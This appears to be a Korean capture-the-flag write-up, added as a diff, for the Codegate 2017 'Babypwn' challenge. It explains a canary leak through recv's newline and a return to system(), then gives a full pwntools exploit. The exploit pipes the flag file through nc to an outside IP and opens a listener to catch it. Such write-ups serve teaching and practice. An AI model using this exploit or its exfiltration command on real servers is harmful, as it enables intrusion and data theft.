@@ -1,0 +1,74 @@
+## Babypwn 50
+
+2017년 Codegate 예선에 등장한 문제로 문제이름처럼 난이도 자체는 어렵지 않다고 생각합니다.  
+먼저 실행파일의 형태와 어떤 보호기법이 적용됬는지 확인해 봅시다.
+
+₩file babypwn`과 ₩checksec babypwn` 이 2개의 명령어를 써서 확인할 수 있습니다.
+
+```
+babypwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=79d683df4838066af61f58fc7025deb99e6bab3d, stripped
+```
+
+```
+[*] '/home/knight/ctf/exploit/babypwn'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+일단 파일은 리눅스 실행파일인 ELF 파일이고 strip 되어있어 main함수를 찾는게 힘들다는 것을 알았습니다.  
+반대로 보호 기법은 특별한 보호기법이 없네요. Canary는 메모리 릭해서 알아내면 될 것 같고 NX는 ROP로 피해 보겠습니다. 물론 ASLR도 잊으면 안되죠.
+
+먼저 이 babypwn이라는 파일이 서버 파일이라는 것을 알아야 합니다. 이는 평소 사용자 입력을 `scanf`등으로 받아오는 것과는 다르게 ₩recv` 함수로 받아들이게 되고 recv는 마지막에 `\x0a`라는 개행문자가 들어오게 됩니다. 이를 이용해서 Canary를 읽어 올수 있습니다.
+
+Buffer은 40바이트인데 총 읽어들일수 있는 바이트는 100바이트 입니다. 즉 오버플로우가 가능하게 되죠. 그러나 40 바이트 바로뒤에는 Canary가 자리잡고 있기 때문에 바로 오버플로우를 시도하는 것은 불가능합니다. 먼저 Canary를 알아내야 하죠. 원래 40바이트의 버퍼는 0으로 초기화 되어 있고 Canary같은 경우에도 가장 마지막 바이트가 `\x00`이라서 출력을 할 때 Canary가 같이 출력되는 것을 막아줍니다. 그러나 만약 40바이트를 입력하게 되면 어떻게 될까요? 아까 설명드렸듯이 recv함수는 사용자 입력뒤에 `\x0a`를 자동으로 추가해줍니다. 그러니 40바이트를 입력하면 버퍼가 다차고 Canary의 가장 마지막 `\x00`역시 `\x0a`로 대체되기 때문에 Canary가 출력되게 되고 버퍼 오버플로우가 가능해지게 됩니다.  이렇게 Canary를 회피하는 방법을 알아봤습니다.
+
+이제 NX를 회피해 봅시다. IDA와 같은 디버거를 통해서 존재하는 함수들을 모구 확인해보면 system함수가 Code 영역에 이미 링크되어 있는 것을 확인할 수 있습니다. 만약 ret주소를 스택이 아닌 이 시스템 함수로 우회한다면 NX를 간단하게 회피할 수 있을 것입니다. 32비트 컴퓨터에서 함수의 인자를 넘기는 방법은 `[함수 주소][AAAA][인자]` 이런 식으로 호출하면 됩니다. 만약 시스템 함수를 호출하여 쉘을 얻으려 한다면 `[System Addr][AAAA]["/bin/bash" Addr]` 같은 방법으로 호출하면 되는 것이지요.
+
+System 함수는 코드영역에 링크되어 있어서 ASLR로도 변하지 않기 때문에 걱정할 필요하 없습니다. 이제 인자의 주소값을 찾는 것이 문제가 되는 것이지요. `/bin/bash`를 libc에서도 찾을 수 있지만 그럼 libc의 주소값을 찾아야 하기 때문에 이번에는 100바이트의 입력가능한 버퍼중 일부에 리눅스 커맨드를 넣고 해당 스택 주소를 넣기로 하겠습니다.  스택 주소를 찾는 방법 역시 Canary를 찾은 방법과 같이 메모리 릭으로 가능하므로 설명은 생략하도록 하겠습니다. 이런 식으로 쉘 스크립트를 작성하게되면 쉽게 Flag를 얻을 수 있습니다.
+
+앞서 말씀드렸듯 이는 서버 프로그램으로써 쉘을 클라이언트 측에서 얻기 위해서는 입력과 출력을 서버 소켓으로 리다이렉트를 해야합니다. 그러나 이는 100바이트 내에서 ROP으로 구현하기 까다로운 관계로 저는 flag 파일을 읽어서 nc 로 해당 내용을 클라이언트에게 돌려주도록 스크립트를 짰습니다.  물론 그러려면 클라이언트에서도 서버를 열어야 하므로 서버를 여는 부분도 포함했습니다.
+
+최종 스크립트는 다음과 같습니다.
+```
+from pwn import *
+import binascii
+import socket
+hexy = lambda x: int(binascii.hexlify(x), 16)
+
+proc = remote("localhost", 8181)
+proc.recvuntil('>')
+proc.sendline('1')
+proc.recvuntil(':')
+proc.sendline("a"*40)
+sample = proc.recvuntil('>')
+canary = sample.split('\n')[1].lstrip('a'*39)
+canary = hexy(canary[::-1])<<8
+proc.sendline('1')
+proc.recvuntil(':')
+proc.sendline('aaaa'*12+'aaa')
+buf = proc.recvuntil('>').split('\n')[1]
+buf = buf[:4][::-1]
+buf = hexy(buf) - 300
+proc.sendline('1')
+proc.recvuntil(':')
+payload = p64(hexy("ls -al"[::-1]))
+proc.sendline(p32(0x8048b86)*12+"aaaaaaaa"+p32(0x08048620)+"aaaa"+p64(buf)+p32(hexy('cat '[::-1]))+p32(hexy("./fl"[::-1]))+p32(hexy("ag|n"[::-1]))+p32(hexy("c 19"[::-1]))+p32(hexy("2.16"[::-1]))+p32(hexy("8.0."[::-1]))+p32(hexy("2 3"[::-1])))
+proc.recvuntil('>')
+proc.sendline('2')
+proc.recvuntil(':')
+proc.sendline("a"*40+p64(canary))
+proc.recvuntil('>')
+proc.sendline('3')
+
+print proc.recv(1024)
+socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+socket.bind(("192.168.0.2", 3))
+socket.listen(5)
+client, addr = socket.accept()
+print client.recv(1024)
+```
+
+이해가 되지 않거나 틀린부분은 메일을 보내주세요.
